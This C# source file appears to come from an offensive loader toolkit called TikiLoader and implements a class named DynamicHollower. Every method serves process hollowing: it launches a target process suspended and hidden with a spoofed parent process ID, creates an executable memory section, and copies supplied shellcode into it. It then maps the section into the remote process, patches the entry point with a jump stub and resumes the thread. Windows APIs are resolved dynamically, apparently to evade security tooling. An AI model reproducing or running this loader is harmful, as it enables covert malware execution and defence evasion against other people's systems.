using System;
using System.Runtime.InteropServices;


using static TikiLoader.Structs;
using static TikiLoader.Enums;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace TikiLoader
{
    public class DynamicHollower
    {
        public struct DELEGATES
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void GetSystemInfo(
                ref SYSTEM_INFO lpSysInfo
            );

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetCurrentProcess();
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwMapViewOfSection(
                IntPtr section, 
                IntPtr process, 
                ref IntPtr baseAddr, 
                IntPtr zeroBits,
                IntPtr commitSize, 
                IntPtr stuff, 
                ref IntPtr viewSize, 
                int inheritDispo, 
                AllocationType alloctype, 
                MemoryProtection prot);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwCreateSection(
                ref IntPtr section,
                uint desiredAccess,
                IntPtr pAttrs,
                ref LARGE_INTEGER pMaxSize,
                MemoryProtection pageProt, 
                AllocationType allocationAttribs,
                IntPtr hFile);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwQueryInformationProcess(
                IntPtr hProcess,
                int procInformationClass,
                ref PROCESS_BASIC_INFORMATION procInformation,
                uint ProcInfoLen,
                ref uint retlen);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ReadProcessMemory(
                IntPtr hProcess, 
                IntPtr lpBaseAddress, 
                [Out] byte[] lpBuffer,
                int dwSize,
                out IntPtr lpNumberOfBytesRead);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool WriteProcessMemory(
                IntPtr hProcess, 
                IntPtr lpBaseAddress,
                IntPtr lpBuffer,
                IntPtr nSize,
                out IntPtr lpNumWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint ResumeThread(
                IntPtr hThread);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwUnmapViewOfSection(
                IntPtr hSection,
                IntPtr address);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool InitializeProcThreadAttributeList(
                IntPtr lpAttributeList, 
                int dwAttributeCount,
                int dwFlags,
                ref IntPtr lpSize);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UpdateProcThreadAttribute(
                IntPtr lpAttributeList,
                uint dwFlags, 
                IntPtr Attribute, 
                IntPtr lpValue, 
                IntPtr cbSize,
                IntPtr lpPreviousValue, 
                IntPtr lpReturnSize);


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool DeleteProcThreadAttributeList(
               IntPtr lpAttributeList);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CloseHandle(IntPtr handle);
        }

        private const int AttributeSize = 24;
        private const ulong PatchSize = 0x10;

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;


        /*
       [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
       public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
       */
         
        public static void GetSystemInfo(ref SYSTEM_INFO lpSysInfo)
        {
            object[] funcargs = { lpSysInfo };
            DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"GetSystemInfo", typeof(DELEGATES.GetSystemInfo), ref funcargs);
        }

        
        public static IntPtr GetCurrentProcess()
        {
            object[] funcargs = { };
            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"GetCurrentProcess", typeof(DELEGATES.GetCurrentProcess), ref funcargs);
        }


        public static int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, AllocationType alloctype, MemoryProtection prot)
        {
            object[] funcargs =
            {
                section,
                process,
                baseAddr,
                zeroBits,
                commitSize,
                stuff,
                viewSize,
                inheritDispo,
                alloctype,
                prot
            };

            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwMapViewOfSection", typeof(DELEGATES.ZwMapViewOfSection), ref funcargs);
        }

        public static int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, MemoryProtection pageProt, AllocationType allocationAttribs, IntPtr hFile)
        {
            object[] funcargs =
            {
                section,
                desiredAccess,
                pAttrs,
                pMaxSize,
                pageProt,
                allocationAttribs,
                hFile
            };
            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwCreateSection", typeof(DELEGATES.ZwMapViewOfSection), ref funcargs);
        }

      
        public static int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen)
        {
            object[] funcargs =
            {
                hProcess,
                procInformationClass,
                procInformation,
                ProcInfoLen,
                retlen
            };
            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwQueryInformationProcess", typeof(DELEGATES.ZwQueryInformationProcess), ref funcargs);
        }


        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
        {
            lpNumberOfBytesRead = default;
            object[] funcargs =
            {
                hProcess,
                lpBaseAddress,
                lpBuffer,
                dwSize,
                lpNumberOfBytesRead
            };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ReadProcessMemory", typeof(DELEGATES.ReadProcessMemory), ref funcargs);
        }

        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten)
        {
            lpNumWritten = default;
            object[] funcargs =
            {
                hProcess, 
                lpBaseAddress,
                lpBuffer,
                nSize,
                lpNumWritten
            };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"WriteProcessMemory", typeof(DELEGATES.WriteProcessMemory), ref funcargs);
        }



        public static uint ResumeThread(IntPtr hThread)
        {
            object[] funcargs = { hThread };
            return (uint)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ResumeThread", typeof(DELEGATES.ResumeThread), ref funcargs);
        }

        public static int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address)
        {
            object[] funcargs =
            {
                hSection,
                address
            };
            return (int)DinvokeGenerics.DynamicAPIInvoke(@"ntdll.dll", @"ZwUnmapViewOfSection", typeof(DELEGATES.ZwUnmapViewOfSection), ref funcargs);
        }

        public static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
        {
            object[] funcargs =
            {
                lpAttributeList,
                dwFlags,
                Attribute,
                lpValue,
                cbSize,
                lpPreviousValue,
                lpReturnSize
            };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcargs);
        }

        public static bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
        {
            object[] funcargs = { lpAttributeList };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref funcargs);
        }

        public static bool CloseHandle(IntPtr handle)
        {
            object[] funcargs = { handle };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"CloseHandle", typeof(DELEGATES.CloseHandle), ref funcargs);
        }

        public static uint round_to_page(uint size)
        {
            try
            {
                SYSTEM_INFO info = new SYSTEM_INFO();
                GetSystemInfo(ref info);
                Console.WriteLine(info.dwPageSize);
                return (info.dwPageSize - size % info.dwPageSize) + size;
            }
            catch(Exception e)
            {
                Console.WriteLine($"inside round to page got exception: {e} ");
                return (uint)0;
            }
        }

        private bool nt_success(long v)
        {
            return (v >= 0);
        }
       
        private IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemoryProtection protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        private bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        private void SetLocalSection(uint size)
        {
            var vals = MapSection(GetCurrent(), MemoryProtection.ReadWrite, IntPtr.Zero);

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        private void CopyShellcode(byte[] buf)
        {
            var lsize = size_;

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        private IntPtr FindEntry(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {
            var tmp = MapSection(pInfo.hProcess, MemoryProtection.ExecuteRead, IntPtr.Zero);

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = BuildEntryPatch(tmp.Key);

            try
            {
                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();

            ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
            var res = ResumeThread(pInfo.hThread);
        }

        private IntPtr GetBuffer()
        {
            return localmap_;
        }

        ~DynamicHollower()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);
        }

        public static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)
        {
            object[] funcargs =
            {
                lpAttributeList,
                dwAttributeCount,
                dwFlags,
                lpSize
            };

            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcargs);
        }


        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);


        public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                int ProcThreadAttributeParentProcess = 0x00020000;
                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

        }

        public static string GetAllFootprints(Exception x)
        {
            var st = new StackTrace(x, true);
            var frames = st.GetFrames();
            var traceString = new StringBuilder();

            foreach (var frame in frames)
            {
                if (frame.GetFileLineNumber() < 1)
                    continue;

                traceString.Append("File: " + frame.GetFileName());
                traceString.Append(", Method:" + frame.GetMethod().Name);
                traceString.Append(", LineNumber: " + frame.GetFileLineNumber());
                traceString.Append("  -->  ");
            }

            return traceString.ToString();

        }

        public void Hollow(string binary, byte[] shellcode, int ppid)
        {
            try
            {
                var pinf = StartProcess(binary, ppid);
                Console.WriteLine("Started process");
                FindEntry(pinf.hProcess);
                Console.WriteLine("found entry");
                CreateSection((uint)shellcode.Length);
                Console.WriteLine("Created section");
                SetLocalSection((uint)shellcode.Length);
                Console.WriteLine("After SetLocalSection");
                CopyShellcode(shellcode);
                Console.WriteLine("Copied shellcode");
                MapAndStart(pinf);
                Console.WriteLine("Mapped and started");
                CloseHandle(pinf.hThread);
                Console.WriteLine("Closed handle for pinf");
                CloseHandle(pinf.hProcess);
                Console.WriteLine("closed handle hProcess");
            }
            catch(Exception e)
            {
                Console.WriteLine($"an exception occurred changevirtualemoryr {e}");
                Debug.WriteLine(GetAllFootprints(e));
            }
        }

    }
}
